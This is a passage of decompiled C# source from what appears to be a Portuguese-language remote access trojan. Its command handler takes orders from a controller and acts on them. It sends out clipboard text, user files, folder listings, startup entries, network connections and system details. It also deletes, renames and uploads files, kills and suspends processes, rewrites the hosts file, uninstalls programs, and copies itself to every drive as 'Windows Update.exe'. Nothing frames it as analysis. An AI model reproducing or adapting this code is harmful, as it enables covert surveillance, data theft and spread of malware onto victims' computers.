              checked { ++index; }
            }
          }
          catch (Exception ex)
          {
            ProjectData.SetProjectError(ex);
            ProjectData.ClearProjectError();
          }
        }
        else if (Operators.CompareString(Left2, "form12", false) == 0)
          Fransesco.Send("form12");
        else if (Operators.CompareString(Left2, "ResumerrProcesss", false) == 0)
        {
          try
          {
            Fransesco.NtResumeProcess(Process.GetProcessById(Conversions.ToInteger(strArray1[1])).Handle);
          }
          catch (Exception ex)
          {
            ProjectData.SetProjectError(ex);
            ProjectData.ClearProjectError();
          }
        }
        else if (Operators.CompareString(Left2, "SuspenderProcesss", false) == 0)
        {
          try
          {
            Fransesco.NtSuspendProcess(Process.GetProcessById(Conversions.ToInteger(strArray1[1])).Handle);
          }
          catch (Exception ex)
          {
            ProjectData.SetProjectError(ex);
            ProjectData.ClearProjectError();
          }
        }
        else if (Operators.CompareString(Left2, "RestarttProcesss", false) == 0)
        {
          try
          {
            TextBox textBox = new TextBox();
            textBox.Text = strArray1[1];
            Process.GetProcessById(Conversions.ToInteger(strArray1[2])).Kill();
            Process.Start(textBox.Text);
          }
          catch (Exception ex)
          {
            ProjectData.SetProjectError(ex);
            ProjectData.ClearProjectError();
          }
        }
        else if (Operators.CompareString(Left2, "PermisaoStartUpp", false) == 0)
          Fransesco.Send("ChamaFrmStartUpsss" + Fransesco.Y + Environment.MachineName + "/" + Environment.UserName + Fransesco.Y);
        else if (Operators.CompareString(Left2, "EnviarStartupsssa", false) == 0)
        {
          Application.DoEvents();
          string Left3;
          try
          {
            string name1 = "Software\\Microsoft\\Windows\\CurrentVersion\\Run\\";
            string[] valueNames = Registry.CurrentUser.OpenSubKey(name1).GetValueNames();
            int index = 0;
            while (index < valueNames.Length)
            {
              string name2 = valueNames[index];
              Left3 = Conversions.ToString(Operators.AddObject((object) Left3, Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject((object) ("%CU_RUN%.|." + name2 + ".|."), Registry.CurrentUser.OpenSubKey(name1).GetValue(name2)), (object) ".|."), (object) "\r\n")));
              checked { ++index; }
            }
          }
          catch (Exception ex)
          {
            ProjectData.SetProjectError(ex);
            ProjectData.ClearProjectError();
          }
          try
          {
            string name3 = "Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce\\";
            string[] valueNames = Registry.CurrentUser.OpenSubKey(name3).GetValueNames();
            int index = 0;
            while (index < valueNames.Length)
            {
              string name4 = valueNames[index];
              Left3 = Conversions.ToString(Operators.AddObject((object) Left3, Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject((object) ("%CU_ONCE%.|." + name4 + ".|."), Registry.CurrentUser.OpenSubKey(name3).GetValue(name4)), (object) ".|."), (object) "\r\n")));
              checked { ++index; }
            }
          }
          catch (Exception ex)
          {
            ProjectData.SetProjectError(ex);
            ProjectData.ClearProjectError();
          }
          try
          {
            string name5 = "Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\Run\\";
            string[] valueNames = Registry.CurrentUser.OpenSubKey(name5).GetValueNames();
            int index = 0;
            while (index < valueNames.Length)
            {
              string name6 = valueNames[index];
              Left3 = Conversions.ToString(Operators.AddObject((object) Left3, Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject((object) ("%CU_EXPLO%.|." + name6 + ".|."), Registry.CurrentUser.OpenSubKey(name5).GetValue(name6)), (object) ".|."), (object) "\r\n")));
              checked { ++index; }
            }
          }
          catch (Exception ex)
          {
            ProjectData.SetProjectError(ex);
            ProjectData.ClearProjectError();
          }
          try
          {
            string name7 = "Software\\Microsoft\\Windows\\CurrentVersion\\Run\\";
            string[] valueNames = Registry.LocalMachine.OpenSubKey(name7).GetValueNames();
            int index = 0;
            while (index < valueNames.Length)
            {
              string name8 = valueNames[index];
              Left3 = Conversions.ToString(Operators.AddObject((object) Left3, Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject((object) ("%MA_RUN%.|." + name8 + ".|."), Registry.LocalMachine.OpenSubKey(name7).GetValue(name8)), (object) ".|."), (object) "\r\n")));
              checked { ++index; }
            }
          }
          catch (Exception ex)
          {
            ProjectData.SetProjectError(ex);
            ProjectData.ClearProjectError();
          }
          try
          {
            string name9 = "Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce\\";
            string[] valueNames = Registry.LocalMachine.OpenSubKey(name9).GetValueNames();
            int index = 0;
            while (index < valueNames.Length)
            {
              string name10 = valueNames[index];
              Left3 = Conversions.ToString(Operators.AddObject((object) Left3, Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject((object) ("%MA_ONCE%.|." + name10 + ".|."), Registry.LocalMachine.OpenSubKey(name9).GetValue(name10)), (object) ".|."), (object) "\r\n")));
              checked { ++index; }
            }
          }
          catch (Exception ex)
          {
            ProjectData.SetProjectError(ex);
            ProjectData.ClearProjectError();
          }
          try
          {
            string name11 = "Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\Run\\";
            string[] valueNames = Registry.LocalMachine.OpenSubKey(name11).GetValueNames();
            int index = 0;
            while (index < valueNames.Length)
            {
              string name12 = valueNames[index];
              Left3 = Conversions.ToString(Operators.AddObject((object) Left3, Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject((object) ("%MA_EXPLO%.|." + name12 + ".|."), Registry.LocalMachine.OpenSubKey(name11).GetValue(name12)), (object) ".|."), (object) "\r\n")));
              checked { ++index; }
            }
          }
          catch (Exception ex)
          {
            ProjectData.SetProjectError(ex);
            ProjectData.ClearProjectError();
          }
          try
          {
            string[] files = Directory.GetFiles(Environment.GetFolderPath(Environment.SpecialFolder.Startup));
            int index = 0;
            while (index < files.Length)
            {
              string path = files[index];
              Left3 = Conversions.ToString(Operators.AddObject((object) Left3, Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject((object) ("%FOLD_UP%.|." + Path.GetFileName(path) + ".|."), Fransesco.SetBytes((object) path.Length)), (object) ".|."), (object) "\r\n")));
              checked { ++index; }
            }
          }
          catch (Exception ex)
          {
            ProjectData.SetProjectError(ex);
            ProjectData.ClearProjectError();
          }
          Fransesco.Send("EnviarStartupDadoss" + Fransesco.Y + Left3 + Fransesco.Y);
        }
        else if (Operators.CompareString(Left2, "ExcluirKeyyy", false) == 0)
        {
          object key = (object) Fransesco.GetKey(strArray1[1]);
          object[] objArray4 = new object[2];
          object[] objArray5 = objArray4;
          string[] strArray4 = strArray1;
          string[] strArray5 = strArray4;
          int index3 = 2;
          int index4 = index3;
          string str = strArray5[index4];
          objArray5[0] = (object) str;
          objArray4[1] = (object) false;
          object[] objArray6 = objArray4;
          object[] Arguments = objArray6;
          bool[] flagArray = new bool[2]{ true, false };
          bool[] CopyBack = flagArray;
          NewLateBinding.LateCall(key, (System.Type) null, "DeleteValue", Arguments, (string[]) null, (System.Type[]) null, CopyBack, true);
          if (flagArray[0])
            strArray4[index3] = (string) Conversions.ChangeType(RuntimeHelpers.GetObjectValue(objArray6[0]), typeof (string));
        }
        else if (Operators.CompareString(Left2, "ExcluirArquivoStartUp", false) == 0)
        {
          try
          {
            System.IO.File.Delete(Environment.GetFolderPath(Environment.SpecialFolder.Startup) + "\\" + strArray1[1]);
          }
          catch (Exception ex)
          {
            ProjectData.SetProjectError(ex);
            ProjectData.ClearProjectError();
          }
        }
        else if (Operators.CompareString(Left2, "spreading", false) == 0)
        {
          try
          {
            DriveInfo[] drives = DriveInfo.GetDrives();
            int index = 0;
            while (index < drives.Length)
            {
              DriveInfo driveInfo = drives[index];
              Application.DoEvents();
              Thread.Sleep(10);
              if (driveInfo.IsReady)
              {
                if (!Fransesco.loc)
                  System.IO.File.Copy(Application.ExecutablePath, driveInfo.RootDirectory.FullName + "Windows Update.exe", true);
                else
                  System.IO.File.Copy(Application.ExecutablePath, driveInfo.RootDirectory.FullName + Conversions.ToString(Fransesco.loc), true);
              }
              checked { ++index; }
            }
          }
          catch (Exception ex)
          {
            ProjectData.SetProjectError(ex);
            ProjectData.ClearProjectError();
          }
        }
        else if (Operators.CompareString(Left2, "EnviarServidorChamaFormClipboard", false) == 0)
          Fransesco.Send("FormClipboard" + Fransesco.Y + Environment.UserName + "/" + Environment.MachineName + Fransesco.Y);
        else if (Operators.CompareString(Left2, "EnviarServidorChamaFormClipboard", false) == 0)
          Fransesco.Send("FormClipboard" + Fransesco.Y + Environment.UserName + "/" + Environment.MachineName + Fransesco.Y);
        else if (Operators.CompareString(Left2, "MeuTextoClipboard", false) == 0)
          Fransesco.Send("TextoClipboard" + Fransesco.Y + MyProject.Computer.Clipboard.GetText().ToString() + Fransesco.Y);
        else if (Operators.CompareString(Left2, "NovoClipboard", false) == 0)
          Clipboard.SetText(strArray1[1]);
        else if (Operators.CompareString(Left2, "ExcluirClipboard", false) == 0)
          Clipboard.Clear();
        else if (Operators.CompareString(Left2, "OpenPage", false) == 0)
          Process.Start(strArray1[1]);
        else if (Operators.CompareString(Left2, "BlocKPage", false) == 0)
        {
          MyProject.Computer.FileSystem.WriteAllText("C:\\WINDOWS\\system32\\drivers\\etc\\hosts", "\r\n127.0.0.1" + strArray1[1], true);
          MyProject.Computer.FileSystem.WriteAllText("C:\\WINDOWS\\system32\\drivers\\etc\\hosts", "\r\n" + Fransesco.H + strArray1[1], true);
        }
        else if (Operators.CompareString(Left2, "Restart", false) != 0)
        {
          if (Operators.CompareString(Left2, "PermisaoGerenciadorMineee", false) == 0)
            Fransesco.Send("ChamaFrmGerenciadorr" + Fransesco.Y + Environment.MachineName + "/" + Environment.UserName + Fransesco.Y);
          else if (Operators.CompareString(Left2, "|DiscosG|", false) == 0)
          {
            Application.DoEvents();
            string str;
            try
            {
              string Left4;
              str = Conversions.ToString(Operators.AddObject((object) Left4, Fransesco.GetDiscos()));
            }
            catch (Exception ex)
            {
              ProjectData.SetProjectError(ex);
              ProjectData.ClearProjectError();
            }
            Fransesco.Send("EnviarResultadoGerenciadorrr" + Fransesco.Y + str + Fransesco.Y);
          }
          else if (Operators.CompareString(Left2, "|DesktopG|", false) == 0)
          {
            Application.DoEvents();
            string Left5;
            try
            {
              string Left6;
              Left5 = Conversions.ToString(Operators.AddObject((object) Left6, Fransesco.GetPastas((object) Environment.GetFolderPath(Environment.SpecialFolder.Desktop))));
            }
            catch (Exception ex)
            {
              ProjectData.SetProjectError(ex);
              ProjectData.ClearProjectError();
            }
            try
            {
              Left5 = Conversions.ToString(Operators.AddObject((object) Left5, Fransesco.GetArquivos((object) Environment.GetFolderPath(Environment.SpecialFolder.Desktop))));
            }
            catch (Exception ex)
            {
              ProjectData.SetProjectError(ex);
              ProjectData.ClearProjectError();
            }
            Fransesco.Send("EnviarResultadoGerenciadorrr" + Fransesco.Y + Left5 + Fransesco.Y + Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + Fransesco.Y);
          }
          else if (Operators.CompareString(Left2, "|ArProgramasG|", false) == 0)
          {
            Application.DoEvents();
            string Left7;
            try
            {
              string Left8;
              Left7 = Conversions.ToString(Operators.AddObject((object) Left8, Fransesco.GetPastas((object) Environment.GetFolderPath(Environment.SpecialFolder.ProgramFiles))));
            }
            catch (Exception ex)
            {
              ProjectData.SetProjectError(ex);
              ProjectData.ClearProjectError();
            }
            try
            {
              Left7 = Conversions.ToString(Operators.AddObject((object) Left7, Fransesco.GetArquivos((object) Environment.GetFolderPath(Environment.SpecialFolder.ProgramFiles))));
            }
            catch (Exception ex)
            {
              ProjectData.SetProjectError(ex);
              ProjectData.ClearProjectError();
            }
            Fransesco.Send("EnviarResultadoGerenciadorrr" + Fransesco.Y + Left7 + Fransesco.Y + Environment.GetFolderPath(Environment.SpecialFolder.ProgramFiles) + Fransesco.Y);
          }
          else if (Operators.CompareString(Left2, "|DocumentosG|", false) == 0)
          {
            Application.DoEvents();
            string Left9;
            try
            {
              string Left10;
              Left9 = Conversions.ToString(Operators.AddObject((object) Left10, Fransesco.GetPastas((object) Environment.GetFolderPath(Environment.SpecialFolder.Personal))));
            }
            catch (Exception ex)
            {
              ProjectData.SetProjectError(ex);
              ProjectData.ClearProjectError();
            }
            try
            {
              Left9 = Conversions.ToString(Operators.AddObject((object) Left9, Fransesco.GetArquivos((object) Environment.GetFolderPath(Environment.SpecialFolder.Personal))));
            }
            catch (Exception ex)
            {
              ProjectData.SetProjectError(ex);
              ProjectData.ClearProjectError();
            }
            Fransesco.Send("EnviarResultadoGerenciadorrr" + Fransesco.Y + Left9 + Fransesco.Y + Environment.GetFolderPath(Environment.SpecialFolder.Personal) + Fransesco.Y);
          }
          else if (Operators.CompareString(Left2, "|DownloadsG|", false) == 0)
          {
            Application.DoEvents();
            string Left11;
            try
            {
              string Left12;
              Left11 = Conversions.ToString(Operators.AddObject((object) Left12, Fransesco.GetPastas((object) ("C:\\Users\\" + Environment.UserName + "\\Downloads"))));
            }
            catch (Exception ex)
            {
              ProjectData.SetProjectError(ex);
              ProjectData.ClearProjectError();
            }
            try
            {
              Left11 = Conversions.ToString(Operators.AddObject((object) Left11, Fransesco.GetArquivos((object) ("C:\\Users\\" + Environment.UserName + "\\Downloads"))));
            }
            catch (Exception ex)
            {
              ProjectData.SetProjectError(ex);
              ProjectData.ClearProjectError();
            }
            Fransesco.Send("EnviarResultadoGerenciadorrr" + Fransesco.Y + Left11 + Fransesco.Y + "C:\\Users\\" + Environment.UserName + "\\Downloads" + Fransesco.Y);
          }
          else if (Operators.CompareString(Left2, "|ImagensG|", false) == 0)
          {
            Application.DoEvents();
            string Left13;
            try
            {
              string Left14;
              Left13 = Conversions.ToString(Operators.AddObject((object) Left14, Fransesco.GetPastas((object) Environment.GetFolderPath(Environment.SpecialFolder.MyPictures))));
            }
            catch (Exception ex)
            {
              ProjectData.SetProjectError(ex);
              ProjectData.ClearProjectError();
            }
            try
            {
              Left13 = Conversions.ToString(Operators.AddObject((object) Left13, Fransesco.GetArquivos((object) Environment.GetFolderPath(Environment.SpecialFolder.MyPictures))));
            }
            catch (Exception ex)
            {
              ProjectData.SetProjectError(ex);
              ProjectData.ClearProjectError();
            }
            Fransesco.Send("EnviarResultadoGerenciadorrr" + Fransesco.Y + Left13 + Fransesco.Y + Environment.GetFolderPath(Environment.SpecialFolder.MyPictures) + Fransesco.Y);
          }
          else if (Operators.CompareString(Left2, "|MusicasG|", false) == 0)
          {
            Application.DoEvents();
            string Left15;
            try
            {
              string Left16;
              Left15 = Conversions.ToString(Operators.AddObject((object) Left16, Fransesco.GetPastas((object) Environment.GetFolderPath(Environment.SpecialFolder.MyMusic))));
            }
            catch (Exception ex)
            {
              ProjectData.SetProjectError(ex);
              ProjectData.ClearProjectError();
            }
            try
            {
              Left15 = Conversions.ToString(Operators.AddObject((object) Left15, Fransesco.GetArquivos((object) Environment.GetFolderPath(Environment.SpecialFolder.MyMusic))));
            }
            catch (Exception ex)
            {
              ProjectData.SetProjectError(ex);
              ProjectData.ClearProjectError();
            }
            Fransesco.Send("EnviarResultadoGerenciadorrr" + Fransesco.Y + Left15 + Fransesco.Y + Environment.GetFolderPath(Environment.SpecialFolder.MyMusic) + Fransesco.Y);
          }
          else if (Operators.CompareString(Left2, "|VideosG|", false) == 0)
          {
            Application.DoEvents();
            string Left17;
            try
            {
              string Left18;
              Left17 = Conversions.ToString(Operators.AddObject((object) Left18, Fransesco.GetPastas((object) ("C:\\Users\\" + Environment.UserName + "\\Videos"))));
            }
            catch (Exception ex)
            {
              ProjectData.SetProjectError(ex);
              ProjectData.ClearProjectError();
            }
            try
            {
              Left17 = Conversions.ToString(Operators.AddObject((object) Left17, Fransesco.GetArquivos((object) ("C:\\Users\\" + Environment.UserName + "\\Videos"))));
            }
            catch (Exception ex)
            {
              ProjectData.SetProjectError(ex);
              ProjectData.ClearProjectError();
            }
            Fransesco.Send("EnviarResultadoGerenciadorrr" + Fransesco.Y + Left17 + Fransesco.Y + "C:\\Users\\" + Environment.UserName + "\\Videos" + Fransesco.Y);
          }
          else if (Operators.CompareString(Left2, "|AtualizarG|", false) == 0)
          {
            Application.DoEvents();
            string Left19;
            try
            {
              string Left20;
              Left19 = Conversions.ToString(Operators.AddObject((object) Left20, Fransesco.GetPastas((object) strArray1[1])));
            }
            catch (Exception ex)
            {
              ProjectData.SetProjectError(ex);
              ProjectData.ClearProjectError();
            }
            try
            {
              Left19 = Conversions.ToString(Operators.AddObject((object) Left19, Fransesco.GetArquivos((object) strArray1[1])));
            }
            catch (Exception ex)
            {
              ProjectData.SetProjectError(ex);
              ProjectData.ClearProjectError();
            }
            Fransesco.Send("EnviarResultadoGerenciadorrr" + Fransesco.Y + Left19 + Fransesco.Y + strArray1[1] + Fransesco.Y);
          }
          else if (Operators.CompareString(Left2, "|NavegarG|", false) == 0)
          {
            Application.DoEvents();
            string Left21;
            try
            {
              string Left22;
              Left21 = Conversions.ToString(Operators.AddObject((object) Left22, Fransesco.GetPastas((object) strArray1[1])));
            }
            catch (Exception ex)
            {
              ProjectData.SetProjectError(ex);
              ProjectData.ClearProjectError();
            }
            try
            {
              Left21 = Conversions.ToString(Operators.AddObject((object) Left21, Fransesco.GetArquivos((object) strArray1[1])));
            }
            catch (Exception ex)
            {
              ProjectData.SetProjectError(ex);
              ProjectData.ClearProjectError();
            }
            Fransesco.Send("EnviarResultadoGerenciadorrr" + Fransesco.Y + Left21 + Fransesco.Y + strArray1[1] + Fransesco.Y);
          }
          else if (Operators.CompareString(Left2, "|InicializarG|", false) == 0)
          {
            Application.DoEvents();
            string Left23;
            try
            {
              string Left24;
              Left23 = Conversions.ToString(Operators.AddObject((object) Left24, Fransesco.GetPastas((object) Environment.GetFolderPath(Environment.SpecialFolder.Startup))));
            }
            catch (Exception ex)
            {
              ProjectData.SetProjectError(ex);
              ProjectData.ClearProjectError();
            }
            try
            {
              Left23 = Conversions.ToString(Operators.AddObject((object) Left23, Fransesco.GetArquivos((object) Environment.GetFolderPath(Environment.SpecialFolder.Startup))));
            }
            catch (Exception ex)
            {
              ProjectData.SetProjectError(ex);
              ProjectData.ClearProjectError();
            }
            Fransesco.Send("EnviarResultadoGerenciadorrr" + Fransesco.Y + Left23 + Fransesco.Y + Environment.GetFolderPath(Environment.SpecialFolder.Startup) + Fransesco.Y);
          }
          else if (Operators.CompareString(Left2, "|WindowsG|", false) == 0)
          {
            Application.DoEvents();
            string Left25;
            try
            {
              string Left26;
              Left25 = Conversions.ToString(Operators.AddObject((object) Left26, Fransesco.GetPastas((object) "C:\\Windows")));
            }
            catch (Exception ex)
            {
              ProjectData.SetProjectError(ex);
              ProjectData.ClearProjectError();
            }
            try
            {
              Left25 = Conversions.ToString(Operators.AddObject((object) Left25, Fransesco.GetArquivos((object) "C:\\Windows")));
            }
            catch (Exception ex)
            {
              ProjectData.SetProjectError(ex);
              ProjectData.ClearProjectError();
            }
            Fransesco.Send("EnviarResultadoGerenciadorrr" + Fransesco.Y + Left25 + Fransesco.Y + "C:\\Windows" + Fransesco.Y);
          }
          else if (Operators.CompareString(Left2, "|SistemaG|", false) == 0)
          {
            Application.DoEvents();
            string Left27;
            try
            {
              string Left28;
              Left27 = Conversions.ToString(Operators.AddObject((object) Left28, Fransesco.GetPastas((object) Environment.GetFolderPath(Environment.SpecialFolder.System))));
            }
            catch (Exception ex)
            {
              ProjectData.SetProjectError(ex);
              ProjectData.ClearProjectError();
            }
            try
            {
              Left27 = Conversions.ToString(Operators.AddObject((object) Left27, Fransesco.GetArquivos((object) Environment.GetFolderPath(Environment.SpecialFolder.System))));
            }
            catch (Exception ex)
            {
              ProjectData.SetProjectError(ex);
              ProjectData.ClearProjectError();
            }
            Fransesco.Send("EnviarResultadoGerenciadorrr" + Fransesco.Y + Left27 + Fransesco.Y + Environment.GetFolderPath(Environment.SpecialFolder.System) + Fransesco.Y);
          }
          else if (Operators.CompareString(Left2, "|VisualizarG|", false) == 0)
          {
            bool CM = true;
            string base64String = Convert.ToBase64String(Fransesco.ZIP(System.IO.File.ReadAllBytes(strArray1[1]), ref CM));
            Fransesco.SB(ref base64String);
            MemoryStream memoryStream = new MemoryStream();
            string S = "ChamaFrmVisualizar" + Fransesco.Y;
            memoryStream.Write(Fransesco.SB(ref S), 0, S.Length);
            memoryStream.Write(buffer, 0, buffer.Length);
            Fransesco.Send(memoryStream.ToArray());
          }
          else if (Operators.CompareString(Left2, "|RenomearPastaG|", false) == 0)
          {
            try
            {
              MyProject.Computer.FileSystem.RenameDirectory(strArray1[1], strArray1[2]);
            }
            catch (Exception ex)
            {
              ProjectData.SetProjectError(ex);
              ProjectData.ClearProjectError();
            }
          }
          else if (Operators.CompareString(Left2, "|RenomearArquivoG|", false) == 0)
          {
            try
            {
              MyProject.Computer.FileSystem.RenameFile(strArray1[1], strArray1[2]);
            }
            catch (Exception ex)
            {
              ProjectData.SetProjectError(ex);
              ProjectData.ClearProjectError();
            }
          }
          else if (Operators.CompareString(Left2, "|ExcluirPastaG|", false) == 0)
          {
            try
            {
              Directory.Delete(strArray1[1], true);
            }
            catch (Exception ex)
            {
              ProjectData.SetProjectError(ex);
              ProjectData.ClearProjectError();
            }
          }
          else if (Operators.CompareString(Left2, "|ExcluirArquivoG|", false) == 0)
          {
            try
            {
              System.IO.File.Delete(strArray1[1]);
            }
            catch (Exception ex)
            {
              ProjectData.SetProjectError(ex);
              ProjectData.ClearProjectError();
            }
          }
          else if (Operators.CompareString(Left2, "|BaixarArquivoG|", false) == 0)
          {
            byte[] B = System.IO.File.ReadAllBytes(strArray1[1]);
            bool flag = true;
            ref bool local = ref flag;
            string base64String = Convert.ToBase64String(Fransesco.ZIP(B, ref local));
            Fransesco.SB(ref base64String);
            MemoryStream memoryStream = new MemoryStream();
            string S = "EnviarBaixaArquivoG" + Fransesco.Y + Fransesco.MeuNome() + Fransesco.Y + Path.GetFileName(strArray1[1]) + Fransesco.Y + MyProject.Computer.FileSystem.GetFileInfo(strArray1[1]).Length.ToString() + Fransesco.Y + strArray1[1] + Fransesco.Y;
            memoryStream.Write(Fransesco.SB(ref S), 0, S.Length);
            memoryStream.Write(buffer, 0, buffer.Length);
            Fransesco.Send(memoryStream.ToArray());
          }
          else if (Operators.CompareString(Left2, "|EnviarArquivoMineG|", false) == 0)
          {
            try
            {
              byte[] B = Convert.FromBase64String(strArray1[3]);
              bool flag = false;
              ref bool local = ref flag;
              byte[] bytes = Fransesco.ZIP(B, ref local);
              System.IO.File.WriteAllBytes(strArray1[1] + "\\" + strArray1[2], bytes);
            }
            catch (Exception ex)
            {
              ProjectData.SetProjectError(ex);
              ProjectData.ClearProjectError();
            }
          }
          else if (Operators.CompareString(Left2, "Permisaoconesaosss", false) == 0)
            Fransesco.Send("ChamaFrmConexaoo" + Fransesco.Y + Environment.MachineName + "/" + Environment.UserName + Fransesco.Y);
          else if (Operators.CompareString(Left2, "EnviarConxaoooodd", false) == 0)
          {
            try
            {
              string str = string.Empty;
              TcpConnectionInformation[] activeTcpConnections = IPGlobalProperties.GetIPGlobalProperties().GetActiveTcpConnections();
              int index = 0;
              while (index < activeTcpConnections.Length)
              {
                TcpConnectionInformation connectionInformation = activeTcpConnections[index];
                str = str + string.Format("{0}|{1}|{2}", (object) connectionInformation.LocalEndPoint, (object) connectionInformation.RemoteEndPoint, (object) connectionInformation.State) + "\r\n";
                checked { ++index; }
              }
              Fransesco.Send("EnviarDadosConexaooo" + Fransesco.Y + str.Trim() + Fransesco.Y);
            }
            catch (Exception ex)
            {
              ProjectData.SetProjectError(ex);
              ProjectData.ClearProjectError();
            }
          }
          else if (Operators.CompareString(Left2, "PermisaoGJanelas", false) == 0)
            Fransesco.Send("EnviarPermitirForm" + Fransesco.Y + Environment.MachineName + "/" + Environment.UserName + Fransesco.Y);
          else if (Operators.CompareString(Left2, "EnviarJanelasFf", false) == 0)
          {
            string str = "";
            Process[] processes = Process.GetProcesses(".");
            int index = 0;
            while (index < processes.Length)
            {
              Process process = processes[index];
              try
              {
                if (process.MainWindowTitle.Length > 0)
                  str = str + process.MainWindowTitle + "%|%" + process.Handle.ToString() + "%|%\r\n";
              }
              catch (Exception ex)
              {
                ProjectData.SetProjectError(ex);
                ProjectData.ClearProjectError();
              }
              checked { ++index; }
            }
            Fransesco.Send("EnviarPermitirFormJanelas" + Fransesco.Y + str + Fransesco.Y);
          }
          else if (Operators.CompareString(Left2, "PrimsaoFormProgramas", false) == 0)
            Fransesco.Send("ChamaFormProgramas" + Fransesco.Y + Environment.MachineName + "/" + Environment.UserName + Fransesco.Y);
          else if (Operators.CompareString(Left2, "EnviarListaProgramas", false) == 0)
          {
            try
            {
              string name = "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Uninstall\\";
              string[] subKeyNames = Registry.LocalMachine.OpenSubKey(name).GetSubKeyNames();
              int index = 0;
              string Left29;
              while (index < subKeyNames.Length)
              {
                string str = subKeyNames[index];
                Left29 = Conversions.ToString(Operators.AddObject((object) Left29, Operators.ConcatenateObject(Operators.ConcatenateObject(Registry.GetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Uninstall\\" + str + "\\", "DisplayName", (object) "N/A"), (object) "%|%"), (object) "\r\n")));
                checked { ++index; }
              }
              Fransesco.Send("LiiiistaProgramas" + Fransesco.Y + Left29 + Fransesco.Y);
            }
            catch (Exception ex)
            {
              ProjectData.SetProjectError(ex);
              ProjectData.ClearProjectError();
            }
          }
          else if (Operators.CompareString(Left2, "DesinsTalarProgramass", false) == 0)
          {
            try
            {
              string name13 = "Software\\Microsoft\\Windows\\CurrentVersion\\Uninstall";
              string empty = string.Empty;
              RegistryKey registryKey1 = MyProject.Computer.Registry.LocalMachine.OpenSubKey(name13);
              string[] subKeyNames = registryKey1.GetSubKeyNames();
              int index = 0;
              while (index < subKeyNames.Length)
              {
                string name14 = subKeyNames[index];
                RegistryKey registryKey2 = registryKey1.OpenSubKey(name14);
                if (Operators.CompareString(Conversions.ToString(registryKey2.GetValue("DisplayName", (object) "")), strArray1[1], false) == 0)
                  NewLateBinding.LateCall((object) null, typeof (Process), "Start", new object[1]
                  {
                    RuntimeHelpers.GetObjectValue(registryKey2.GetValue("UninstallString", (object) ""))
                  }, (string[]) null, (System.Type[]) null, (bool[]) null, true);
                checked { ++index; }
              }
            }
            catch (Exception ex)
            {
              ProjectData.SetProjectError(ex);
              ProjectData.ClearProjectError();
            }
          }
          else if (Operators.CompareString(Left2, "EnviarPermisaoDeInfomacaoParaServidor", false) == 0)
            Fransesco.Send("ChamaFormInformacao" + Fransesco.Y + Environment.UserName + "/" + Environment.MachineName + Fransesco.Y);
          else if (Operators.CompareString(Left2, "TextoInformacoes", false) == 0)
          {
            try
            {
              Application.DoEvents();
              string str3 = Application.ExecutablePath + Fransesco.Y;
              string str4 = System.IO.File.GetAttributes(Application.ExecutablePath).ToString() + Fransesco.Y;
              string str5 = Fransesco.DR + Fransesco.Y;
              string str6 = Fransesco.P + Fransesco.Y;
              string str7 = Fransesco.H + Fransesco.Y;
              string str8 = Fransesco.EXE + Fransesco.Y;
              string str9 = Conversions.ToString(Operators.ConcatenateObject(Fransesco.Data(), (object) Fransesco.Y));
              string str10 = "127.0.0.1" + Fransesco.Y;
              string str11 = NetworkInterface.GetAllNetworkInterfaces()[0].GetPhysicalAddress().ToString() + Fransesco.Y;
              string str12 = SystemInformation.ComputerName + Fransesco.Y;
              string str13 = SystemInformation.UserDomainName + Fransesco.Y;
              string str14 = SystemInformation.UserName + Fransesco.Y;
              string str15 = SystemInformation.MonitorCount.ToString() + Fransesco.Y;
              string str16 = SystemInformation.VirtualScreen.Width.ToString() + "x" + SystemInformation.VirtualScreen.Height.ToString() + Fransesco.Y;
              string str17 = MyProject.Computer.Info.OSFullName + Fransesco.Y;
              string str18 = MyProject.Computer.Info.OSPlatform + Fransesco.Y;
              string str19 = MyProject.Computer.Info.OSVersion + Fransesco.Y;
              string str20 = Conversions.ToString(Operators.ConcatenateObject(Fransesco.SetBytes((object) MyProject.Computer.Info.TotalPhysicalMemory), (object) Fransesco.Y));
              string str21 = SystemInformation.PowerStatus.BatteryChargeStatus.ToString() + " (" + Conversions.ToString(SystemInformation.PowerStatus.BatteryLifePercent * 100f) + "%)" + Fransesco.Y;
              string str22 = Conversions.ToString(Operators.ConcatenateObject(MyProject.Computer.Registry.GetValue("HKEY_LOCAL_MACHINE\\HARDWARE\\DESCRIPTION\\System\\CentralProcessor\\0", "ProcessorNameString", (object) "N/A"), (object) Fransesco.Y));
              string str23 = Conversions.ToString(Operators.ConcatenateObject(MyProject.Computer.Registry.GetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winsat", "PrimaryAdapterString", (object) "N/A"), (object) Fransesco.Y));
              string str24 = string.Empty + Conversions.ToString(Math.Round((double) Environment.TickCount / 86400000.0)) + " Dias, " + Conversions.ToString(Math.Round((double) Environment.TickCount / 3600000.0 % 24.0)) + " Horas, " + Conversions.ToString(Math.Round((double) Environment.TickCount / 120000.0 % 60.0)) + " Minutos, " + Conversions.ToString(Math.Round((double) Environment.TickCount / 1000.0 % 60.0)) + " Segundos." + Fransesco.Y;
              string str25 = Conversions.ToString(Operators.ConcatenateObject(MyProject.Computer.Registry.GetValue("HKEY_LOCAL_MACHINE\\HARDWARE\\DESCRIPTION\\System\\CentralProcessor\\0", "Identifier", (object) "N/A"), (object) Fransesco.Y));
              string str26 = Conversions.ToString(MyProject.Computer.Clock.LocalTime) + Fransesco.Y;
              string str27 = Fransesco.Cam() != Conversions.ToBoolean("True") ? "Não" + Fransesco.Y : "Sim" + Fransesco.Y;
              string s = Fransesco.ACT();
              string str28 = Fransesco.DEB(ref s) + Fransesco.Y;
              string str29 = Environment.SystemDirectory + Fransesco.Y;
